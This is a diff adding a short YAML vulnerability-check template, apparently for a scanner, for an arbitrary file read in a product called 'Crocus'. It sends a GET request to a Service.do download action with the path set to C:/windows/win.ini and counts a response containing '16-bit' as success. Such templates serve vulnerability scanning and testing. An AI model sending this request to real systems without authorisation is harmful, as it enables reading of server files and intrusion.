@@ -1,0 +1,9 @@
+name: poc-yaml-Crocus系统-Diretory
+description: "任意文件读取"
+method: GET
+path:
+  - /Service.do?Action=Download&Path=C:/windows/win.ini
+expression:
+  status: 200
+  body_all:
+    - "16-bit"
